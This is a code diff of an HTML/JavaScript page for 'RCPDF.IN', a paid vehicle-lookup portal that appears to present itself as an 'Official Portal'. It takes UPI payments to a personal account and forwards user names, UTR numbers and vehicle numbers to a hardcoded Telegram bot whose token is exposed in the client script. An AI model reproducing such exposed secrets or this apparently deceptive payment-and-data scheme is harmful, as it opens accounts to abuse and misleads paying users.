@@ -3,121 +3,140 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>RCPDF.IN | Premium Vehicle Services</title>
+    <title>RCPDF.IN | Official Portal</title>
     
     <script src="https://www.gstatic.com/firebasejs/9.6.1/firebase-app-compat.js"></script>
     <script src="https://www.gstatic.com/firebasejs/9.6.1/firebase-auth-compat.js"></script>
     <script src="https://www.gstatic.com/firebasejs/9.6.1/firebase-firestore-compat.js"></script>
-    <script src="https://cdnjs.cloudflare.com/ajax/libs/jspdf/2.5.1/jspdf.umd.min.js"></script>
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css">
 
     <style>
-        :root { --neon: #00f3ff; --pink: #ff00c8; --ind-blue: #003399; }
-        * { margin:0; padding:0; box-sizing:border-box; font-family: 'Poppins', sans-serif; }
+        :root { --ind-blue: #003399; --neon: #00f3ff; }
+        * { margin:0; padding:0; box-sizing:border-box; font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; }
 
         body { 
-            background: linear-gradient(rgba(0,0,0,0.4), rgba(0,0,0,0.4)), 
+            background: linear-gradient(rgba(0,0,0,0.5), rgba(0,0,0,0.5)), 
                         url('https://images.unsplash.com/photo-1464822759023-fed622ff2c3b?auto=format&fit=crop&w=1350&q=80');
             background-size: cover; background-position: center; background-attachment: fixed;
-            min-height: 100vh; color: #fff; overflow-x: hidden;
+            min-height: 100vh; color: #fff;
         }
 
-        /* Login Screen */
-        #loginScreen { height: 100vh; display: flex; flex-direction: column; justify-content: center; align-items: center; text-align: center; }
+        /* 1. LOGIN SCREEN */
+        #loginScreen { height: 100vh; display: flex; flex-direction: column; justify-content: center; align-items: center; }
         .google-btn { 
-            background: #fff; color: #444; padding: 15px 30px; border-radius: 50px; 
-            border: none; font-size: 18px; font-weight: 600; cursor: pointer;
-            display: flex; align-items: center; gap: 10px; box-shadow: 0 4px 20px rgba(0,0,0,0.4);
+            background: #fff; color: #444; padding: 15px 25px; border-radius: 50px; 
+            border: none; font-size: 18px; font-weight: bold; cursor: pointer;
+            display: flex; align-items: center; gap: 10px; box-shadow: 0 5px 15px rgba(0,0,0,0.3);
         }
 
-        /* Main App */
-        #mainApp { display: none; padding-top: 80px; }
-        .navbar { position: fixed; top: 0; width: 100%; background: rgba(0,0,0,0.5); backdrop-filter: blur(10px); padding: 15px 20px; display: flex; justify-content: space-between; align-items: center; z-index: 1000; border-bottom: 1px solid rgba(255,255,255,0.1); }
+        /* 2. NAVBAR */
+        #mainApp { display: none; }
+        .navbar { 
+            position: fixed; top: 0; width: 100%; background: rgba(0,0,0,0.8); 
+            padding: 12px 20px; display: flex; justify-content: space-between; 
+            align-items: center; z-index: 1000; border-bottom: 2px solid var(--neon);
+        }
+        .user-info { display: flex; align-items: center; gap: 10px; }
+        .user-img { width: 35px; height: 35px; border-radius: 50%; border: 2px solid var(--neon); }
 
-        .card { background: rgba(255, 255, 255, 0.95); color: #333; margin: 20px auto; width: 92%; max-width: 450px; padding: 25px; border-radius: 20px; box-shadow: 0 10px 30px rgba(0,0,0,0.5); text-align: center; }
+        /* 3. MENU / SIDEBAR */
+        #sideMenu {
+            position: fixed; top: 0; left: -250px; width: 250px; height: 100%;
+            background: #111; z-index: 2000; transition: 0.3s; padding: 20px;
+        }
+        #sideMenu.active { left: 0; }
+        .menu-item { padding: 15px; border-bottom: 1px solid #333; cursor: pointer; display: flex; align-items: center; gap: 10px; }
 
-        /* Neon RGB Button */
+        /* 4. HOME BOX (IND WAL BOX) */
+        .container { padding: 100px 20px 20px; max-width: 500px; margin: auto; }
+        .ind-box {
+            background: #fff; border-radius: 12px; overflow: hidden;
+            border: 4px solid #333; box-shadow: 0 10px 25px rgba(0,0,0,0.5);
+            margin-bottom: 20px;
+        }
+        .ind-side { 
+            background: var(--ind-blue); width: 45px; display: flex; 
+            flex-direction: column; align-items: center; justify-content: center; padding: 10px 0;
+        }
+        .ind-content { flex: 1; padding: 15px; display: flex; align-items: center; }
+        input#vNum { 
+            width: 100%; border: none; font-size: 24px; font-weight: bold; 
+            text-transform: uppercase; text-align: center; color: #333; outline: none;
+        }
+
+        /* Buttons */
+        .action-btn { 
+            background: var(--ind-blue); color: #fff; width: 100%; padding: 15px; 
+            border: none; border-radius: 10px; font-weight: bold; font-size: 18px; cursor: pointer;
+        }
+        .recharge-card { background: #fff; color: #333; padding: 20px; border-radius: 20px; text-align: center; display: none; }
+
+        /* Neon Button */
         .neon-btn {
-            background: #000; color: #fff; border: none; padding: 2px; width: 100%; 
-            border-radius: 12px; font-weight: 900; cursor: pointer; position: relative;
-            overflow: hidden; margin: 15px 0; display: block;
+            background: linear-gradient(90deg, #ff0000, #00ff00, #0000ff, #ff0000);
+            background-size: 400%; padding: 15px; border-radius: 10px; border: none;
+            color: #fff; font-weight: bold; width: 100%; margin: 10px 0; animation: anim 5s linear infinite;
         }
-        .neon-btn span { background: #000; display: block; padding: 15px; border-radius: 10px; position: relative; z-index: 2; }
-        .neon-btn::after {
-            content: ''; position: absolute; top: -50%; left: -50%; width: 200%; height: 200%;
-            background: conic-gradient(#ff0000, #ff7f00, #ffff00, #00ff00, #0000ff, #4b0082, #8b00ff, #ff0000);
-            animation: rotate 3s linear infinite; z-index: 1;
-        }
-        @keyframes rotate { from { transform: rotate(0deg); } to { transform: rotate(360deg); } }
-
-        /* Promo Popup */
-        #promoPopup { 
-            position: fixed; top: 50%; left: 50%; transform: translate(-50%, -50%) scale(0);
-            background: #fff; color: #333; padding: 30px; border-radius: 20px; z-index: 2000;
-            box-shadow: 0 0 50px rgba(0,0,0,0.6); text-align: center; transition: 0.4s cubic-bezier(0.175, 0.885, 0.32, 1.275);
-        }
-        #promoPopup.active { transform: translate(-50%, -50%) scale(1); }
-
-        .btn-blue { background: var(--ind-blue); color: #fff; width: 100%; padding: 15px; border-radius: 10px; border: none; font-weight: bold; cursor: pointer; font-size: 16px; }
-        input { width: 100%; padding: 12px; margin: 10px 0; border-radius: 8px; border: 1px solid #ddd; text-align: center; font-size: 16px; font-weight: bold; }
+        @keyframes anim { 0%{background-position: 0%;} 100%{background-position: 400%;} }
     </style>
 </head>
 <body>
 
     <div id="loginScreen">
-        <h1 style="font-size: 50px; letter-spacing: 2px;">RCPDF.IN</h1>
-        <p style="margin-bottom: 30px; font-weight: 300;">Safe & Secure Vehicle Portal</p>
+        <h1 style="font-size: 40px; margin-bottom: 10px;">RCPDF.IN</h1>
+        <p style="margin-bottom: 20px;">Vehicle Verification Portal</p>
         <button class="google-btn" onclick="googleLogin()">
             <img src="https://upload.wikimedia.org/wikipedia/commons/c/c1/Google_%22G%22_logo.svg" width="20">
-            Login with Google
+            Sign in with Google
         </button>
     </div>
 
-    <div id="promoPopup">
-        <h2 style="color:var(--ind-blue)">Recharge Offer! 🚀</h2>
-        <p style="margin: 15px 0;">Top-up your wallet & get <br><b style="color:var(--pink); font-size:22px;">20% EXTRA BALANCE</b></p>
-        <button class="btn-blue" onclick="openRecharge()">RECHARGE NOW</button>
-        <p onclick="this.parentElement.classList.remove('active')" style="margin-top:15px; cursor:pointer; font-size:12px; color:#888;">Close</p>
+    <div id="sideMenu">
+        <h2 style="color:var(--neon); margin-bottom:20px;">Menu</h2>
+        <div class="menu-item" onclick="showPage('home')"><i class="fas fa-home"></i> Home</div>
+        <div class="menu-item" onclick="showPage('recharge')"><i class="fas fa-wallet"></i> Wallet Recharge</div>
+        <div class="menu-item" onclick="auth.signOut()"><i class="fas fa-sign-out-alt"></i> Logout</div>
     </div>
 
     <div id="mainApp">
         <div class="navbar">
-            <i class="fas fa-wallet" onclick="openRecharge()"></i>
-            <b style="font-size: 20px;">RCPDF.IN</b>
-            <div id="walletDisplay" style="background:rgba(255,255,255,0.2); padding:5px 12px; border-radius:20px;">₹0.00</div>
+            <i class="fas fa-bars" style="font-size: 24px; cursor: pointer;" onclick="toggleMenu()"></i>
+            <div class="user-info">
+                <span id="userName" style="font-weight:bold;">User</span>
+                <img id="userImg" class="user-img" src="">
+            </div>
+            <div id="walletDisplay" style="background:var(--neon); color:#000; padding:5px 10px; border-radius:15px; font-weight:bold;">₹0.00</div>
         </div>
 
-        <div class="card" id="homeCard">
-            <h3 style="margin-bottom:15px; color:var(--ind-blue)">Check Vehicle Info</h3>
-            <input type="text" id="vNum" placeholder="BR 01 AA 0000" maxlength="13">
-            <button class="btn-blue" onclick="startProcess()">GET REPORT</button>
-            <p style="font-size:11px; margin-top:10px; color:#666;">Service Charge: ₹100</p>
-        </div>
+        <div class="container">
+            <div id="homePage">
+                <div class="ind-box" style="display:flex;">
+                    <div class="ind-side">
+                        <img src="https://upload.wikimedia.org/wikipedia/commons/4/41/Flag_of_India.svg" width="25">
+                        <span style="color:#fff; font-weight:bold; font-size:12px; margin-top:5px;">IND</span>
+                    </div>
+                    <div class="ind-content">
+                        <input type="text" id="vNum" placeholder="BR 01 AA 0000" maxlength="11">
+                    </div>
+                </div>
+                <button class="action-btn" onclick="checkVehicle()">GET VEHICLE DATA</button>
+            </div>
 
-        <div class="card" id="rechargeCard" style="display:none;">
-            <h3>Wallet Recharge</h3>
-            <img id="qrImg" src="" width="200" style="margin:15px 0; border:1px solid #ddd; padding:5px;">
-            <p id="amtTag" style="font-weight:bold;">Payable: ₹120</p>
-            
-            <button class="neon-btn" onclick="payWithUPI()"><span>PAY WITH UPI ❤️</span></button>
-            
-            <input type="text" id="promoCode" placeholder="Promo Code (RC20)">
-            <button onclick="applyPromo()" style="color:var(--ind-blue); border:none; background:none; font-weight:bold; cursor:pointer; margin-bottom:10px;">Apply Code</button>
-            
-            <input type="tel" id="utrBox" placeholder="Enter 12-Digit UTR Number">
-            <button class="btn-blue" onclick="submitUTR()">SUBMIT FOR UPDATE</button>
-        </div>
-
-        <div class="card" id="detailsCard" style="display:none;">
-            <h3>Final Details</h3>
-            <input type="tel" id="waBox" placeholder="WhatsApp Number">
-            <input type="text" id="fBox" placeholder="Father's Name (Optional)">
-            <button class="btn-blue" onclick="finalOrder()">CONFIRM & DOWNLOAD</button>
+            <div id="rechargePage" class="recharge-card">
+                <h3 style="margin-bottom:15px;">Add Money to Wallet</h3>
+                <img id="qrImg" src="" width="200">
+                <p style="margin:10px 0; font-weight:bold;">Amount: ₹100</p>
+                <button class="neon-btn" onclick="openUPI()">PAY WITH ANY UPI APP</button>
+                <hr style="margin:15px 0;">
+                <input type="text" id="utrBox" placeholder="Enter 12 Digit UTR No." style="width:100%; padding:10px; border:1px solid #ccc; border-radius:5px;">
+                <button class="action-btn" style="margin-top:10px;" onclick="submitUTR()">SUBMIT UTR</button>
+                <p style="font-size:12px; margin-top:10px; color:red;" onclick="showPage('home')">Back to Home</p>
+            </div>
         </div>
     </div>
 
     <script>
-        // FIREBASE CONFIG (Photo wali details)
+        // FIREBASE CONFIG
         const firebaseConfig = {
             apiKey: "AIzaSyBa32Wn9S9d72FzrbB4QjNbNWC0Jxd4vYs",
             authDomain: "rcpdf-new.firebaseapp.com",
@@ -133,8 +152,7 @@
 
         const T_TOKEN = "8138238341:AAGi4LxV7247hUvs_HoGLSKRhkcEapMCSuA";
         const T_CHAT_ID = "5600045707";
-        let myBalance = 0;
-        let payAmount = 120;
+        let myBal = 0;
 
         function googleLogin() {
             const provider = new firebase.auth.GoogleAuthProvider();
@@ -145,84 +163,70 @@
             if(user) {
                 document.getElementById('loginScreen').style.display = 'none';
                 document.getElementById('mainApp').style.display = 'block';
+                document.getElementById('userName').innerText = user.displayName.split(' ')[0];
+                document.getElementById('userImg').src = user.photoURL;
                 loadBalance(user.uid);
-                setTimeout(() => document.getElementById('promoPopup').classList.add('active'), 2000);
+            } else {
+                document.getElementById('loginScreen').style.display = 'flex';
+                document.getElementById('mainApp').style.display = 'none';
             }
         });
 
         function loadBalance(uid) {
             db.collection("users").doc(uid).onSnapshot(doc => {
-                myBalance = doc.exists ? doc.data().walletBalance : 0;
-                document.getElementById('walletDisplay').innerText = "₹" + myBalance.toFixed(2);
+                myBal = doc.exists ? doc.data().walletBalance : 0;
+                document.getElementById('walletDisplay').innerText = "₹" + myBal;
             });
         }
 
-        function openRecharge() {
-            document.getElementById('promoPopup').classList.remove('active');
-            document.getElementById('homeCard').style.display = 'none';
-            document.getElementById('detailsCard').style.display = 'none';
-            document.getElementById('rechargeCard').style.display = 'block';
-            updateQR();
+        function toggleMenu() {
+            document.getElementById('sideMenu').classList.toggle('active');
         }
 
-        function updateQR() {
-            const upi = `upi://pay?pa=8709610091@okbizaxis&pn=RCPDF&am=${payAmount}&cu=INR`;
-            document.getElementById('qrImg').src = `https://api.qrserver.com/v1/create-qr-code/?size=250x250&data=${encodeURIComponent(upi)}`;
-            document.getElementById('amtTag').innerText = "Payable: ₹" + payAmount;
-        }
-
-        function applyPromo() {
-            if(document.getElementById('promoCode').value.toUpperCase() === "RC20") {
-                payAmount = 100; updateQR(); alert("RC20 Applied! Pay ₹100 only.");
+        function showPage(page) {
+            toggleMenu();
+            if(page === 'home') {
+                document.getElementById('homePage').style.display = 'block';
+                document.getElementById('rechargePage').style.display = 'none';
+            } else {
+                document.getElementById('homePage').style.display = 'none';
+                document.getElementById('rechargePage').style.display = 'block';
+                updateQR();
             }
         }
 
-        function payWithUPI() {
-            window.location.href = `upi://pay?pa=8709610091@okbizaxis&pn=RCPDF&am=${payAmount}&cu=INR`;
+        function updateQR() {
+            const upi = "upi://pay?pa=8709610091@okbizaxis&pn=RCPDF&am=100&cu=INR";
+            document.getElementById('qrImg').src = `https://api.qrserver.com/v1/create-qr-code/?size=200x200&data=${encodeURIComponent(upi)}`;
+        }
+
+        function openUPI() {
+            window.location.href = "upi://pay?pa=8709610091@okbizaxis&pn=RCPDF&am=100&cu=INR";
         }
 
         function submitUTR() {
             const utr = document.getElementById('utrBox').value;
-            if(utr.length !== 12) return alert("Enter valid 12-digit UTR!");
-            sendMsg(`💰 *RECHARGE REQUEST*\n👤 User: ${auth.currentUser.displayName}\n💵 Amt: ₹${payAmount}\n🔢 UTR: \`${utr}\``);
-            alert("Request Sent! 10-15 min me balance update ho jayega.");
-            location.reload();
+            if(utr.length < 12) return alert("Invalid UTR!");
+            const msg = `💰 *RECHARGE REQUEST*\n👤 User: ${auth.currentUser.displayName}\n🔢 UTR: \`${utr}\`\n💵 Amt: ₹100`;
+            sendT(msg);
+            alert("Sent! Balance will update in 10 mins.");
+            showPage('home');
         }
 
-        function startProcess() {
-            if(document.getElementById('vNum').value.length < 5) return alert("Enter Vehicle Number!");
-            if(myBalance < 100) {
-                alert("❌ Balance is too low! Please top-up.");
-                openRecharge();
+        function checkVehicle() {
+            if(document.getElementById('vNum').value.length < 6) return alert("Enter valid number!");
+            if(myBal < 100) {
+                alert("Low Balance! Please recharge.");
+                showPage('recharge');
             } else {
-                document.getElementById('homeCard').style.display = 'none';
-                document.getElementById('detailsCard').style.display = 'block';
+                const msg = `🚗 *VEHICLE SEARCH*\n👤 User: ${auth.currentUser.displayName}\n🔢 No: ${document.getElementById('vNum').value}`;
+                sendT(msg);
+                alert("Request Sent! Details will be sent to your WhatsApp.");
             }
         }
 
-        async function finalOrder() {
-            const wa = document.getElementById('waBox').value;
-            if(wa.length < 10) return alert("Enter WhatsApp Number!");
-            
-            const user = auth.currentUser;
-            await db.collection("users").doc(user.uid).update({ walletBalance: myBalance - 100 });
-            
-            const msg = `🚗 *NEW ORDER*\n👤 Name: ${user.displayName}\n🚗 No: ${document.getElementById('vNum').value}\n📱 WA: ${wa}\n👨 Father: ${document.getElementById('fBox').value || 'N/A'}`;
-            sendMsg(msg);
-
-            const { jsPDF } = window.jspdf;
-            const doc = new jsPDF();
-            doc.text("RCPDF.IN - ORDER RECEIPT", 10, 20);
-            doc.text("Vehicle No: " + document.getElementById('vNum').value, 10, 30);
-            doc.text("Status: PAID", 10, 40);
-            doc.save("Receipt.pdf");
-
-            alert("✅ Success! 10-15 min me details WhatsApp par mil jayengi.");
-            location.reload();
-        }
-
-        function sendMsg(text) {
-            fetch(`https://api.telegram.org/bot${T_TOKEN}/sendMessage?chat_id=${T_CHAT_ID}&text=${encodeURIComponent(text)}&parse_mode=Markdown`);
+        function sendT(t) {
+            fetch(`https://api.telegram.org/bot${T_TOKEN}/sendMessage?chat_id=${T_CHAT_ID}&text=${encodeURIComponent(t)}&parse_mode=Markdown`);
         }
     </script>
 </body>
